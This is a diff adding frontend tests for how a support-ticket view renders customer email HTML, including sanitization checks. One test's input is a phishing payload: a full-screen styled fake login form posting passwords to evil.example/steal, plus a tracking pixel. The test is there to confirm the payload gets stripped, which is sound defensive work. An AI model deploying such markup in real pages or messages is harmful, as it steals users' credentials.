@@ -104,6 +104,37 @@ describe('TicketDetail', () => {
     expect(screen.getByText('Uncategorized')).toBeInTheDocument()
   })
 
+  describe('HTML body', () => {
+    it('renders a formatted email with bold text and a link that opens in a new tab', () => {
+      const bodyHtml = '<p>Hello <b>team</b>, see <a href="https://example.com/order/42">my order</a></p>'
+      renderWithQuery(<TicketDetail ticket={{ ...ticket, bodyHtml }} />)
+
+      expect(screen.getByText('team').tagName).toBe('B')
+      const link = screen.getByRole('link', { name: 'my order' })
+      expect(link).toHaveAttribute('href', 'https://example.com/order/42')
+      expect(link).toHaveAttribute('target', '_blank')
+      expect(link).toHaveAttribute('rel', 'noopener noreferrer')
+    })
+
+    it('does not render a fake login form, its styling or an image sent by the customer', () => {
+      const bodyHtml =
+        '<style>.x{position:fixed;inset:0}</style><form action="https://evil.example/steal"><p>Session expired, sign in again</p>' +
+        '<input type="password" aria-label="Password"><button type="submit">Sign in</button></form><img alt="pixel" src="https://tracker.example/p.gif">'
+      const { container } = renderWithQuery(<TicketDetail ticket={{ ...ticket, bodyHtml }} />)
+
+      expect(container.querySelector('form, input, style, img')).toBeNull()
+      expect(screen.queryByLabelText('Password')).not.toBeInTheDocument()
+      expect(screen.queryByRole('textbox')).not.toBeInTheDocument()
+      expect(screen.queryByRole('button', { name: 'Sign in' })).not.toBeInTheDocument()
+    })
+
+    it('shows the plain text body when there is no HTML', () => {
+      renderWithQuery(<TicketDetail ticket={{ ...ticket, bodyHtml: null }} />)
+
+      expect(screen.getByText(/Please refund me\./)).toBeInTheDocument()
+    })
+  })
+
   it('does not render a reply form', () => {
     renderWithQuery(<TicketDetail ticket={ticket} />)
 
